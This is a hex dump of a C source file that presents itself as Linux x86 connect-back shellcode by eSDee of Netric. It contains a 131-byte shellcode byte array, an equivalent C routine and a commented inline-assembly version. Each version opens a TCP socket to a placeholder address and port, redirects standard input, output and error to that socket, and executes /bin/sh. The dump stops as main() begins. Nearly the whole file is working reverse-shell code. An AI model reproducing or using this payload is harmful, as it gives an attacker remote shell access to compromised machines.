00000000  2f 2a 20 6c 69 6e 75 78  20 78 38 36 20 73 68 65  |/* linux x86 she|
00000010  6c 6c 63 6f 64 65 20 62  79 20 65 53 44 65 65 20  |llcode by eSDee |
00000020  6f 66 20 4e 65 74 72 69  63 20 28 77 77 77 2e 6e  |of Netric (www.n|
00000030  65 74 72 69 63 2e 6f 72  67 29 0d 0a 20 2a 20 31  |etric.org).. * 1|
00000040  33 31 20 62 79 74 65 20  2d 20 63 6f 6e 6e 65 63  |31 byte - connec|
00000050  74 20 62 61 63 6b 20 73  68 65 6c 6c 63 6f 64 65  |t back shellcode|
00000060  20 28 70 6f 72 74 3d 30  78 62 30 65 66 29 0d 0a  | (port=0xb0ef)..|
00000070  20 2a 2f 20 20 20 20 20  0d 0a 0d 0a 23 69 6e 63  | */     ....#inc|
00000080  6c 75 64 65 20 3c 73 74  64 69 6f 2e 68 3e 0d 0a  |lude <stdio.h>..|
00000090  0d 0a 63 68 61 72 0d 0a  73 68 65 6c 6c 63 6f 64  |..char..shellcod|
000000a0  65 5b 5d 20 3d 20 0d 0a  20 20 20 20 20 20 20 20  |e[] = ..        |
000000b0  22 5c 78 33 31 5c 78 63  30 5c 78 33 31 5c 78 64  |"\x31\xc0\x31\xd|
000000c0  62 5c 78 33 31 5c 78 63  39 5c 78 35 31 5c 78 62  |b\x31\xc9\x51\xb|
000000d0  31 22 0d 0a 20 20 20 20  20 20 20 20 22 5c 78 30  |1"..        "\x0|
000000e0  36 5c 78 35 31 5c 78 62  31 5c 78 30 31 5c 78 35  |6\x51\xb1\x01\x5|
000000f0  31 5c 78 62 31 5c 78 30  32 5c 78 35 31 22 0d 0a  |1\xb1\x02\x51"..|
00000100  20 20 20 20 20 20 20 20  22 5c 78 38 39 5c 78 65  |        "\x89\xe|
00000110  31 5c 78 62 33 5c 78 30  31 5c 78 62 30 5c 78 36  |1\xb3\x01\xb0\x6|
00000120  36 5c 78 63 64 5c 78 38  30 22 0d 0a 20 20 20 20  |6\xcd\x80"..    |
00000130  20 20 20 20 22 5c 78 38  39 5c 78 63 32 5c 78 33  |    "\x89\xc2\x3|
00000140  31 5c 78 63 30 5c 78 33  31 5c 78 63 39 5c 78 35  |1\xc0\x31\xc9\x5|
00000150  31 5c 78 35 31 22 0d 0a  20 20 20 20 20 20 20 20  |1\x51"..        |
00000160  22 5c 78 36 38 5c 78 34  31 5c 78 34 32 5c 78 34  |"\x68\x41\x42\x4|
00000170  33 5c 78 34 34 5c 78 36  36 5c 78 36 38 5c 78 62  |3\x44\x66\x68\xb|
00000180  30 22 0d 0a 20 20 20 20  20 20 20 20 22 5c 78 65  |0"..        "\xe|
00000190  66 5c 78 62 31 5c 78 30  32 5c 78 36 36 5c 78 35  |f\xb1\x02\x66\x5|
000001a0  31 5c 78 38 39 5c 78 65  37 5c 78 62 33 22 0d 0a  |1\x89\xe7\xb3"..|
000001b0  20 20 20 20 20 20 20 20  22 5c 78 31 30 5c 78 35  |        "\x10\x5|
000001c0  33 5c 78 35 37 5c 78 35  32 5c 78 38 39 5c 78 65  |3\x57\x52\x89\xe|
000001d0  31 5c 78 62 33 5c 78 30  33 22 0d 0a 20 20 20 20  |1\xb3\x03"..    |
000001e0  20 20 20 20 22 5c 78 62  30 5c 78 36 36 5c 78 63  |    "\xb0\x66\xc|
000001f0  64 5c 78 38 30 5c 78 33  31 5c 78 63 39 5c 78 33  |d\x80\x31\xc9\x3|
00000200  39 5c 78 63 31 22 0d 0a  20 20 20 20 20 20 20 20  |9\xc1"..        |
00000210  22 5c 78 37 34 5c 78 30  36 5c 78 33 31 5c 78 63  |"\x74\x06\x31\xc|
00000220  30 5c 78 62 30 5c 78 30  31 5c 78 63 64 5c 78 38  |0\xb0\x01\xcd\x8|
00000230  30 22 0d 0a 20 20 20 20  20 20 20 20 22 5c 78 33  |0"..        "\x3|
00000240  31 5c 78 63 30 5c 78 62  30 5c 78 33 66 5c 78 38  |1\xc0\xb0\x3f\x8|
00000250  39 5c 78 64 33 5c 78 63  64 5c 78 38 30 22 0d 0a  |9\xd3\xcd\x80"..|
00000260  20 20 20 20 20 20 20 20  22 5c 78 33 31 5c 78 63  |        "\x31\xc|
00000270  30 5c 78 62 30 5c 78 33  66 5c 78 38 39 5c 78 64  |0\xb0\x3f\x89\xd|
00000280  33 5c 78 62 31 5c 78 30  31 22 0d 0a 20 20 20 20  |3\xb1\x01"..    |
00000290  20 20 20 20 22 5c 78 63  64 5c 78 38 30 5c 78 33  |    "\xcd\x80\x3|
000002a0  31 5c 78 63 30 5c 78 62  30 5c 78 33 66 5c 78 38  |1\xc0\xb0\x3f\x8|
000002b0  39 5c 78 64 33 22 0d 0a  20 20 20 20 20 20 20 20  |9\xd3"..        |
000002c0  22 5c 78 62 31 5c 78 30  32 5c 78 63 64 5c 78 38  |"\xb1\x02\xcd\x8|
000002d0  30 5c 78 33 31 5c 78 63  30 5c 78 33 31 5c 78 64  |0\x31\xc0\x31\xd|
000002e0  32 22 0d 0a 20 20 20 20  20 20 20 20 22 5c 78 35  |2"..        "\x5|
000002f0  30 5c 78 36 38 5c 78 36  65 5c 78 32 66 5c 78 37  |0\x68\x6e\x2f\x7|
00000300  33 5c 78 36 38 5c 78 36  38 5c 78 32 66 22 0d 0a  |3\x68\x68\x2f"..|
00000310  20 20 20 20 20 20 20 20  22 5c 78 32 66 5c 78 36  |        "\x2f\x6|
00000320  32 5c 78 36 39 5c 78 38  39 5c 78 65 33 5c 78 35  |2\x69\x89\xe3\x5|
00000330  30 5c 78 35 33 5c 78 38  39 22 0d 0a 20 20 20 20  |0\x53\x89"..    |
00000340  20 20 20 20 22 5c 78 65  31 5c 78 62 30 5c 78 30  |    "\xe1\xb0\x0|
00000350  62 5c 78 63 64 5c 78 38  30 5c 78 33 31 5c 78 63  |b\xcd\x80\x31\xc|
00000360  30 5c 78 62 30 22 0d 0a  20 20 20 20 20 20 20 20  |0\xb0"..        |
00000370  22 5c 78 30 31 5c 78 63  64 5c 78 38 30 22 3b 0d  |"\x01\xcd\x80";.|
00000380  0a 0d 0a 69 6e 74 0d 0a  63 5f 63 6f 64 65 28 29  |...int..c_code()|
00000390  0d 0a 7b 0d 0a 20 20 20  20 20 20 20 20 63 68 61  |..{..        cha|
000003a0  72 20 2a 61 72 67 76 5b  32 5d 3b 0d 0a 20 20 20  |r *argv[2];..   |
000003b0  20 20 20 20 20 63 68 61  72 20 2a 73 6f 63 6b 61  |     char *socka|
000003c0  64 64 72 20 3d 20 22 5c  78 30 32 5c 78 30 30 22  |ddr = "\x02\x00"|
000003d0  20 20 20 20 20 20 20 20  20 20 20 20 20 2f 2f 20  |             // |
000003e0  20 41 64 64 72 65 73 73  20 66 61 6d 69 6c 79 0d  | Address family.|
000003f0  0a 20 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |.               |
00000400  20 20 20 20 20 20 20 20  20 20 22 5c 78 65 66 5c  |          "\xef\|
00000410  78 62 30 22 20 20 20 20  20 20 20 20 20 20 20 20  |xb0"            |
00000420  20 2f 2f 20 20 70 6f 72  74 0d 0a 20 20 20 20 20  | //  port..     |
00000430  20 20 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |                |
00000440  20 20 20 20 22 5c 78 30  30 5c 78 30 30 5c 78 30  |    "\x00\x00\x0|
00000450  30 5c 78 30 30 22 20 20  20 20 20 2f 2f 20 20 73  |0\x00"     //  s|
00000460  69 6e 5f 61 64 64 72 0d  0a 20 20 20 20 20 20 20  |in_addr..       |
00000470  20 20 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |                |
00000480  20 20 22 5c 78 30 30 5c  78 30 30 5c 78 30 30 5c  |  "\x00\x00\x00\|
00000490  78 30 30 22 0d 0a 20 20  20 20 20 20 20 20 20 20  |x00"..          |
000004a0  20 20 20 20 20 20 20 20  20 20 20 20 20 20 20 22  |               "|
000004b0  5c 78 30 30 5c 78 30 30  5c 78 30 30 5c 78 30 30  |\x00\x00\x00\x00|
000004c0  22 3b 0d 0a 0d 0a 20 20  20 20 20 20 20 20 69 6e  |";....        in|
000004d0  74 20 73 6f 63 6b 3b 0d  0a 0d 0a 20 20 20 20 20  |t sock;....     |
000004e0  20 20 20 73 6f 63 6b 20  3d 20 73 6f 63 6b 65 74  |   sock = socket|
000004f0  28 32 2c 20 31 2c 20 36  29 3b 0d 0a 20 20 20 20  |(2, 1, 6);..    |
00000500  20 20 20 20 69 66 20 28  63 6f 6e 6e 65 63 74 28  |    if (connect(|
00000510  73 6f 63 6b 2c 20 73 6f  63 6b 61 64 64 72 2c 20  |sock, sockaddr, |
00000520  31 36 29 20 3c 20 30 29  20 65 78 69 74 28 29 3b  |16) < 0) exit();|
00000530  0d 0a 0d 0a 20 20 20 20  20 20 20 20 64 75 70 32  |....        dup2|
00000540  28 73 6f 63 6b 2c 20 30  29 3b 0d 0a 20 20 20 20  |(sock, 0);..    |
00000550  20 20 20 20 64 75 70 32  28 73 6f 63 6b 2c 20 31  |    dup2(sock, 1|
00000560  29 3b 0d 0a 20 20 20 20  20 20 20 20 64 75 70 32  |);..        dup2|
00000570  28 73 6f 63 6b 2c 20 32  29 3b 0d 0a 0d 0a 20 20  |(sock, 2);....  |
00000580  20 20 20 20 20 20 61 72  67 76 5b 30 5d 20 3d 20  |      argv[0] = |
00000590  22 2f 2f 62 69 6e 2f 73  68 22 3b 0d 0a 20 20 20  |"//bin/sh";..   |
000005a0  20 20 20 20 20 61 72 67  76 5b 31 5d 20 3d 20 4e  |     argv[1] = N|
000005b0  55 4c 4c 3b 0d 0a 0d 0a  20 20 20 20 20 20 20 20  |ULL;....        |
000005c0  65 78 65 63 76 65 28 61  72 67 76 5b 30 5d 2c 20  |execve(argv[0], |
000005d0  26 61 72 67 76 5b 30 5d  2c 20 4e 55 4c 4c 29 3b  |&argv[0], NULL);|
000005e0  0d 0a 20 20 20 20 20 20  20 20 65 78 69 74 28 29  |..        exit()|
000005f0  3b 0d 0a 7d 0d 0a 0d 0a  69 6e 74 0d 0a 61 73 6d  |;..}....int..asm|
00000600  5f 63 6f 64 65 28 29 0d  0a 7b 0d 0a 20 20 20 20  |_code()..{..    |
00000610  20 20 20 20 5f 5f 61 73  6d 28 22 20 23 20 73 6f  |    __asm(" # so|
00000620  63 6b 20 3d 20 73 6f 63  6b 65 74 28 32 2c 20 31  |ck = socket(2, 1|
00000630  2c 20 36 29 3b 0d 0a 20  20 20 20 20 20 20 20 20  |, 6);..         |
00000640  20 20 20 20 20 20 20 78  6f 72 6c 20 20 20 20 25  |       xorl    %|
00000650  65 61 78 2c 20 20 20 25  65 61 78 0d 0a 20 20 20  |eax,   %eax..   |
00000660  20 20 20 20 20 20 20 20  20 20 20 20 20 78 6f 72  |             xor|
00000670  6c 20 20 20 20 25 65 62  78 2c 20 20 20 25 65 62  |l    %ebx,   %eb|
00000680  78 0d 0a 20 20 20 20 20  20 20 20 20 20 20 20 20  |x..             |
00000690  20 20 20 78 6f 72 6c 20  20 20 20 25 65 63 78 2c  |   xorl    %ecx,|
000006a0  20 20 20 25 65 63 78 0d  0a 20 20 20 20 20 20 20  |   %ecx..       |
000006b0  20 20 20 20 20 20 20 20  20 70 75 73 68 6c 20 20  |         pushl  |
000006c0  20 25 65 63 78 0d 0a 20  20 20 20 20 20 20 20 20  | %ecx..         |
000006d0  20 20 20 20 20 20 20 6d  6f 76 62 20 20 20 20 24  |       movb    $|
000006e0  36 2c 20 20 20 20 20 25  63 6c 20 20 20 20 20 20  |6,     %cl      |
000006f0  20 20 20 20 20 20 20 23  20 49 50 50 52 4f 54 4f  |       # IPPROTO|
00000700  5f 54 43 50 0d 0a 20 20  20 20 20 20 20 20 20 20  |_TCP..          |
00000710  20 20 20 20 20 20 70 75  73 68 6c 20 20 20 25 65  |      pushl   %e|
00000720  63 78 0d 0a 20 20 20 20  20 20 20 20 20 20 20 20  |cx..            |
00000730  20 20 20 20 6d 6f 76 62  20 20 20 20 24 31 2c 20  |    movb    $1, |
00000740  20 20 20 20 25 63 6c 20  20 20 20 20 20 20 20 20  |    %cl         |
00000750  20 20 20 20 23 20 53 4f  43 4b 5f 53 54 52 45 41  |    # SOCK_STREA|
00000760  4d 0d 0a 20 20 20 20 20  20 20 20 20 20 20 20 20  |M..             |
00000770  20 20 20 70 75 73 68 6c  20 20 20 25 65 63 78 0d  |   pushl   %ecx.|
00000780  0a 20 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |.               |
00000790  20 6d 6f 76 62 20 20 20  20 24 32 2c 20 20 20 20  | movb    $2,    |
000007a0  20 25 63 6c 20 20 20 20  20 20 20 20 20 20 20 20  | %cl            |
000007b0  20 23 20 41 46 5f 49 4e  45 54 0d 0a 20 20 20 20  | # AF_INET..    |
000007c0  20 20 20 20 20 20 20 20  20 20 20 20 70 75 73 68  |            push|
000007d0  6c 20 20 20 25 65 63 78  0d 0a 20 20 20 20 20 20  |l   %ecx..      |
000007e0  20 20 20 20 20 20 20 20  20 20 6d 6f 76 6c 20 20  |          movl  |
000007f0  20 20 25 65 73 70 2c 20  20 20 25 65 63 78 0d 0a  |  %esp,   %ecx..|
00000800  20 20 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |                |
00000810  6d 6f 76 62 20 20 20 20  24 31 2c 20 20 20 20 20  |movb    $1,     |
00000820  25 62 6c 20 20 20 20 20  20 20 20 20 20 20 20 20  |%bl             |
00000830  23 20 53 59 53 5f 53 4f  43 4b 45 54 0d 0a 20 20  |# SYS_SOCKET..  |
00000840  20 20 20 20 20 20 20 20  20 20 20 20 20 20 6d 6f  |              mo|
00000850  76 62 20 20 20 20 24 31  30 32 2c 20 20 20 25 61  |vb    $102,   %a|
00000860  6c 20 20 20 20 20 20 20  20 20 20 20 20 20 23 20  |l             # |
00000870  53 59 53 5f 73 6f 63 6b  65 74 63 61 6c 6c 0d 0a  |SYS_socketcall..|
00000880  20 20 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |                |
00000890  69 6e 74 20 20 20 20 20  24 30 78 38 30 0d 0a 0d  |int     $0x80...|
000008a0  0a 20 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |.               |
000008b0  20 23 20 63 6f 6e 6e 65  63 74 28 73 6f 63 6b 2c  | # connect(sock,|
000008c0  20 73 6f 63 6b 61 64 64  72 2c 20 31 36 29 0d 0a  | sockaddr, 16)..|
000008d0  20 20 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |                |
000008e0  6d 6f 76 6c 20 20 20 20  25 65 61 78 2c 20 20 20  |movl    %eax,   |
000008f0  25 65 64 78 0d 0a 20 20  20 20 20 20 20 20 20 20  |%edx..          |
00000900  20 20 20 20 20 20 78 6f  72 6c 20 20 20 20 25 65  |      xorl    %e|
00000910  61 78 2c 20 20 20 25 65  61 78 0d 0a 20 20 20 20  |ax,   %eax..    |
00000920  20 20 20 20 20 20 20 20  20 20 20 20 78 6f 72 6c  |            xorl|
00000930  20 20 20 20 25 65 63 78  2c 20 20 20 25 65 63 78  |    %ecx,   %ecx|
00000940  0d 0a 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |..              |
00000950  20 20 70 75 73 68 6c 20  20 20 25 65 63 78 0d 0a  |  pushl   %ecx..|
00000960  20 20 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |                |
00000970  70 75 73 68 6c 20 20 20  25 65 63 78 0d 0a 20 20  |pushl   %ecx..  |
00000980  20 20 20 20 20 20 20 20  20 20 20 20 20 20 70 75  |              pu|
00000990  73 68 6c 20 20 20 24 30  78 34 34 34 33 34 32 34  |shl   $0x4443424|
000009a0  31 20 20 20 20 20 20 20  20 20 20 20 20 20 23 20  |1             # |
000009b0  69 70 20 61 64 64 72 65  73 73 0d 0a 20 20 20 20  |ip address..    |
000009c0  20 20 20 20 20 20 20 20  20 20 20 20 70 75 73 68  |            push|
000009d0  77 20 20 20 24 30 78 65  66 62 30 20 20 20 20 20  |w   $0xefb0     |
000009e0  20 20 20 20 20 20 20 20  20 20 20 20 23 20 70 6f  |            # po|
000009f0  72 74 0d 0a 20 20 20 20  20 20 20 20 20 20 20 20  |rt..            |
00000a00  20 20 20 20 6d 6f 76 62  20 20 20 20 24 30 78 30  |    movb    $0x0|
00000a10  32 2c 20 20 25 63 6c 20  20 20 20 20 20 20 20 20  |2,  %cl         |
00000a20  20 20 20 20 23 20 61 64  64 72 65 73 73 20 66 61  |    # address fa|
00000a30  6d 69 6c 79 0d 0a 20 20  20 20 20 20 20 20 20 20  |mily..          |
00000a40  20 20 20 20 20 20 70 75  73 68 77 20 20 20 25 63  |      pushw   %c|
00000a50  78 0d 0a 20 20 20 20 20  20 20 20 20 20 20 20 20  |x..             |
00000a60  20 20 20 6d 6f 76 6c 20  20 20 20 25 65 73 70 2c  |   movl    %esp,|
00000a70  20 20 20 25 65 64 69 0d  0a 20 20 20 20 20 20 20  |   %edi..       |
00000a80  20 20 20 20 20 20 20 20  20 6d 6f 76 62 20 20 20  |         movb   |
00000a90  20 24 31 36 2c 20 20 20  20 25 62 6c 20 20 20 20  | $16,    %bl    |
00000aa0  20 20 20 20 20 20 20 20  20 23 20 73 69 7a 65 6f  |         # sizeo|
00000ab0  66 28 73 6f 63 6b 61 64  64 72 29 0d 0a 20 20 20  |f(sockaddr)..   |
00000ac0  20 20 20 20 20 20 20 20  20 20 20 20 20 70 75 73  |             pus|
00000ad0  68 6c 20 20 20 25 65 62  78 0d 0a 20 20 20 20 20  |hl   %ebx..     |
00000ae0  20 20 20 20 20 20 20 20  20 20 20 70 75 73 68 6c  |           pushl|
00000af0  20 20 20 25 65 64 69 0d  0a 20 20 20 20 20 20 20  |   %edi..       |
00000b00  20 20 20 20 20 20 20 20  20 70 75 73 68 6c 20 20  |         pushl  |
00000b10  20 25 65 64 78 20 20 20  20 20 20 20 20 20 20 20  | %edx           |
00000b20  20 20 20 20 20 20 20 20  20 23 20 73 6f 63 6b 0d  |         # sock.|
00000b30  0a 20 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |.               |
00000b40  20 6d 6f 76 6c 20 20 20  20 25 65 73 70 2c 20 20  | movl    %esp,  |
00000b50  20 25 65 63 78 0d 0a 20  20 20 20 20 20 20 20 20  | %ecx..         |
00000b60  20 20 20 20 20 20 20 6d  6f 76 62 20 20 20 20 24  |       movb    $|
00000b70  33 2c 20 20 20 20 20 25  62 6c 20 20 20 20 20 20  |3,     %bl      |
00000b80  20 20 20 20 20 20 20 23  20 53 59 53 5f 43 4f 4e  |       # SYS_CON|
00000b90  4e 45 43 54 0d 0a 20 20  20 20 20 20 20 20 20 20  |NECT..          |
00000ba0  20 20 20 20 20 20 6d 6f  76 62 20 20 20 20 24 31  |      movb    $1|
00000bb0  30 32 2c 20 20 20 25 61  6c 20 20 20 20 20 20 20  |02,   %al       |
00000bc0  20 20 20 20 20 20 23 20  53 59 53 5f 73 6f 63 6b  |      # SYS_sock|
00000bd0  65 74 63 61 6c 6c 0d 0a  20 20 20 20 20 20 20 20  |etcall..        |
00000be0  20 20 20 20 20 20 20 20  69 6e 74 20 20 20 20 20  |        int     |
00000bf0  24 30 78 38 30 20 20 20  20 20 20 20 20 20 20 20  |$0x80           |
00000c00  0d 0a 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |..              |
00000c10  20 20 78 6f 72 6c 20 20  20 20 25 65 63 78 2c 20  |  xorl    %ecx, |
00000c20  20 20 25 65 63 78 0d 0a  20 20 20 20 20 20 20 20  |  %ecx..        |
00000c30  20 20 20 20 20 20 20 20  63 6d 70 6c 20 20 20 20  |        cmpl    |
00000c40  25 65 61 78 2c 20 20 20  25 65 63 78 0d 0a 20 20  |%eax,   %ecx..  |
00000c50  20 20 20 20 20 20 20 20  20 20 20 20 20 20 6a 65  |              je|
00000c60  20 43 4f 4e 4e 45 43 54  45 44 0d 0a 0d 0a 20 20  | CONNECTED....  |
00000c70  20 20 20 20 20 20 20 20  20 20 20 20 20 20 23 20  |              # |
00000c80  65 78 69 74 28 29 0d 0a  20 20 20 20 20 20 20 20  |exit()..        |
00000c90  20 20 20 20 20 20 20 20  78 6f 72 6c 20 20 20 20  |        xorl    |
00000ca0  25 65 61 78 2c 20 20 20  25 65 61 78 0d 0a 20 20  |%eax,   %eax..  |
00000cb0  20 20 20 20 20 20 20 20  20 20 20 20 20 20 6d 6f  |              mo|
00000cc0  76 62 20 20 20 20 24 31  2c 20 20 20 20 20 25 61  |vb    $1,     %a|
00000cd0  6c 20 20 20 20 20 20 20  20 20 20 20 20 20 23 20  |l             # |
00000ce0  53 59 53 5f 65 78 69 74  0d 0a 20 20 20 20 20 20  |SYS_exit..      |
00000cf0  20 20 20 20 20 20 20 20  20 20 69 6e 74 20 20 20  |          int   |
00000d00  20 20 24 30 78 38 30 0d  0a 0d 0a 20 20 20 20 20  |  $0x80....     |
00000d10  20 20 20 20 20 20 20 20  20 20 20 43 4f 4e 4e 45  |           CONNE|
00000d20  43 54 45 44 3a 0d 0a 20  20 20 20 20 20 20 20 20  |CTED:..         |
00000d30  20 20 20 20 20 20 20 23  20 64 75 70 32 28 73 6f  |       # dup2(so|
00000d40  63 6b 2c 20 30 29 3b 0d  0a 20 20 20 20 20 20 20  |ck, 0);..       |
00000d50  20 20 20 20 20 20 20 20  20 78 6f 72 6c 20 20 20  |         xorl   |
00000d60  20 25 65 61 78 2c 20 20  20 25 65 61 78 0d 0a 20  | %eax,   %eax.. |
00000d70  20 20 20 20 20 20 20 20  20 20 20 20 20 20 20 6d  |               m|
00000d80  6f 76 62 20 20 20 20 24  36 33 2c 20 20 20 20 25  |ovb    $63,    %|
00000d90  61 6c 20 20 20 20 20 20  20 20 20 20 20 20 20 23  |al             #|
00000da0  20 53 59 53 5f 64 75 70  32 0d 0a 20 20 20 20 20  | SYS_dup2..     |
00000db0  20 20 20 20 20 20 20 20  20 20 20 6d 6f 76 6c 20  |           movl |
00000dc0  20 20 20 25 65 64 78 2c  20 20 20 25 65 62 78 20  |   %edx,   %ebx |
00000dd0  20 20 20 20 20 20 20 20  20 20 20 23 20 73 6f 63  |           # soc|
00000de0  6b 0d 0a 20 20 20 20 20  20 20 20 20 20 20 20 20  |k..             |
00000df0  20 20 20 69 6e 74 20 20  20 20 20 24 30 78 38 30  |   int     $0x80|
00000e00  0d 0a 0d 0a 20 20 20 20  20 20 20 20 20 20 20 20  |....            |
00000e10  20 20 20 20 23 20 64 75  70 32 28 73 6f 63 6b 2c  |    # dup2(sock,|
00000e20  20 31 29 3b 0d 0a 20 20  20 20 20 20 20 20 20 20  | 1);..          |
00000e30  20 20 20 20 20 20 78 6f  72 6c 20 20 20 20 25 65  |      xorl    %e|
00000e40  61 78 2c 20 20 20 25 65  61 78 0d 0a 20 20 20 20  |ax,   %eax..    |
00000e50  20 20 20 20 20 20 20 20  20 20 20 20 6d 6f 76 62  |            movb|
00000e60  20 20 20 20 24 36 33 2c  20 20 20 20 25 61 6c 20  |    $63,    %al |
00000e70  20 20 20 20 20 20 20 20  20 20 20 20 23 20 53 59  |            # SY|
00000e80  53 5f 64 75 70 32 0d 0a  20 20 20 20 20 20 20 20  |S_dup2..        |
00000e90  20 20 20 20 20 20 20 20  6d 6f 76 6c 20 20 20 20  |        movl    |
00000ea0  25 65 64 78 2c 20 20 20  25 65 62 78 20 20 20 20  |%edx,   %ebx    |
00000eb0  20 20 20 20 20 20 20 20  23 20 73 6f 63 6b 0d 0a  |        # sock..|
00000ec0  20 20 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |                |
00000ed0  6d 6f 76 62 20 20 20 20  24 31 2c 20 20 20 20 20  |movb    $1,     |
00000ee0  25 63 6c 20 20 20 20 20  20 20 20 20 20 20 20 20  |%cl             |
00000ef0  23 20 73 74 64 6f 75 74  0d 0a 20 20 20 20 20 20  |# stdout..      |
00000f00  20 20 20 20 20 20 20 20  20 20 69 6e 74 20 20 20  |          int   |
00000f10  20 20 24 30 78 38 30 0d  0a 0d 0a 20 20 20 20 20  |  $0x80....     |
00000f20  20 20 20 20 20 20 20 20  20 20 20 23 20 64 75 70  |           # dup|
00000f30  32 28 73 6f 63 6b 2c 20  32 29 3b 0d 0a 20 20 20  |2(sock, 2);..   |
00000f40  20 20 20 20 20 20 20 20  20 20 20 20 20 78 6f 72  |             xor|
00000f50  6c 20 20 20 20 25 65 61  78 2c 20 20 20 25 65 61  |l    %eax,   %ea|
00000f60  78 0d 0a 20 20 20 20 20  20 20 20 20 20 20 20 20  |x..             |
00000f70  20 20 20 6d 6f 76 62 20  20 20 20 24 36 33 2c 20  |   movb    $63, |
00000f80  20 20 20 25 61 6c 20 20  20 20 20 20 20 20 20 20  |   %al          |
00000f90  20 20 20 23 20 53 59 53  5f 64 75 70 32 0d 0a 20  |   # SYS_dup2.. |
00000fa0  20 20 20 20 20 20 20 20  20 20 20 20 20 20 20 6d  |               m|
00000fb0  6f 76 6c 20 20 20 20 25  65 64 78 2c 20 20 20 25  |ovl    %edx,   %|
00000fc0  65 62 78 20 20 20 20 20  20 20 20 20 20 20 20 23  |ebx            #|
00000fd0  20 73 6f 63 6b 0d 0a 20  20 20 20 20 20 20 20 20  | sock..         |
00000fe0  20 20 20 20 20 20 20 6d  6f 76 62 20 20 20 20 24  |       movb    $|
00000ff0  32 2c 20 20 20 20 20 25  63 6c 20 20 20 20 20 20  |2,     %cl      |
00001000  20 20 20 20 20 20 20 23  20 73 74 64 65 72 72 0d  |       # stderr.|
00001010  0a 20 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |.               |
00001020  20 69 6e 74 20 20 20 20  20 24 30 78 38 30 0d 0a  | int     $0x80..|
00001030  0d 0a 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |..              |
00001040  20 20 23 20 65 78 65 63  76 65 28 61 72 67 76 5b  |  # execve(argv[|
00001050  30 5d 2c 20 26 61 72 67  76 5b 30 5d 2c 20 4e 55  |0], &argv[0], NU|
00001060  4c 4c 29 3b 0d 0a 20 20  20 20 20 20 20 20 20 20  |LL);..          |
00001070  20 20 20 20 20 20 78 6f  72 6c 20 20 20 20 25 65  |      xorl    %e|
00001080  61 78 2c 20 20 20 25 65  61 78 0d 0a 20 20 20 20  |ax,   %eax..    |
00001090  20 20 20 20 20 20 20 20  20 20 20 20 78 6f 72 6c  |            xorl|
000010a0  20 20 20 20 25 65 64 78  2c 20 20 20 25 65 64 78  |    %edx,   %edx|
000010b0  0d 0a 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |..              |
000010c0  20 20 70 75 73 68 6c 20  20 20 25 65 61 78 0d 0a  |  pushl   %eax..|
000010d0  20 20 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |                |
000010e0  70 75 73 68 6c 20 20 20  24 30 78 36 38 37 33 32  |pushl   $0x68732|
000010f0  66 36 65 20 20 20 20 20  20 20 20 20 20 20 20 20  |f6e             |
00001100  23 20 74 68 65 20 73 74  72 69 6e 67 0d 0a 20 20  |# the string..  |
00001110  20 20 20 20 20 20 20 20  20 20 20 20 20 20 70 75  |              pu|
00001120  73 68 6c 20 20 20 24 30  78 36 39 36 32 32 66 32  |shl   $0x69622f2|
00001130  66 20 20 20 20 20 20 20  20 20 20 20 20 20 23 20  |f             # |
00001140  2f 2f 62 69 6e 2f 73 68  0d 0a 20 20 20 20 20 20  |//bin/sh..      |
00001150  20 20 20 20 20 20 20 20  20 20 6d 6f 76 6c 20 20  |          movl  |
00001160  20 20 25 65 73 70 2c 20  20 20 25 65 62 78 0d 0a  |  %esp,   %ebx..|
00001170  20 20 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |                |
00001180  70 75 73 68 6c 20 20 20  25 65 61 78 0d 0a 20 20  |pushl   %eax..  |
00001190  20 20 20 20 20 20 20 20  20 20 20 20 20 20 70 75  |              pu|
000011a0  73 68 6c 20 20 20 25 65  62 78 0d 0a 20 20 20 20  |shl   %ebx..    |
000011b0  20 20 20 20 20 20 20 20  20 20 20 20 6d 6f 76 6c  |            movl|
000011c0  20 20 20 20 25 65 73 70  2c 20 20 20 25 65 63 78  |    %esp,   %ecx|
000011d0  0d 0a 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |..              |
000011e0  20 20 6d 6f 76 62 20 20  20 20 24 31 31 2c 20 20  |  movb    $11,  |
000011f0  20 20 25 61 6c 20 20 20  20 20 20 20 20 20 20 20  |  %al           |
00001200  20 20 23 20 53 59 53 5f  65 78 65 63 76 65 0d 0a  |  # SYS_execve..|
00001210  20 20 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |                |
00001220  69 6e 74 20 20 20 20 20  24 30 78 38 30 0d 0a 0d  |int     $0x80...|
00001230  0a 20 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |.               |
00001240  20 23 20 65 78 69 74 28  29 0d 0a 20 20 20 20 20  | # exit()..     |
00001250  20 20 20 20 20 20 20 20  20 20 20 78 6f 72 6c 20  |           xorl |
00001260  20 20 20 25 65 61 78 2c  20 20 20 25 65 61 78 0d  |   %eax,   %eax.|
00001270  0a 20 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |.               |
00001280  20 6d 6f 76 62 20 20 20  20 24 31 2c 20 20 20 20  | movb    $1,    |
00001290  20 25 61 6c 20 20 20 20  20 20 20 20 20 20 20 20  | %al            |
000012a0  20 23 20 53 59 53 5f 65  78 69 74 0d 0a 20 20 20  | # SYS_exit..   |
000012b0  20 20 20 20 20 20 20 20  20 20 20 20 20 69 6e 74  |             int|
000012c0  20 20 20 20 20 24 30 78  38 30 0d 0a 20 20 20 20  |     $0x80..    |
000012d0  20 20 20 20 20 20 20 20  20 20 20 20 22 29 3b 0d  |            ");.|
000012e0  0a 7d 0d 0a 0d 0a 69 6e  74 0d 0a 6d 61 69 6e 28  |.}....int..main(|
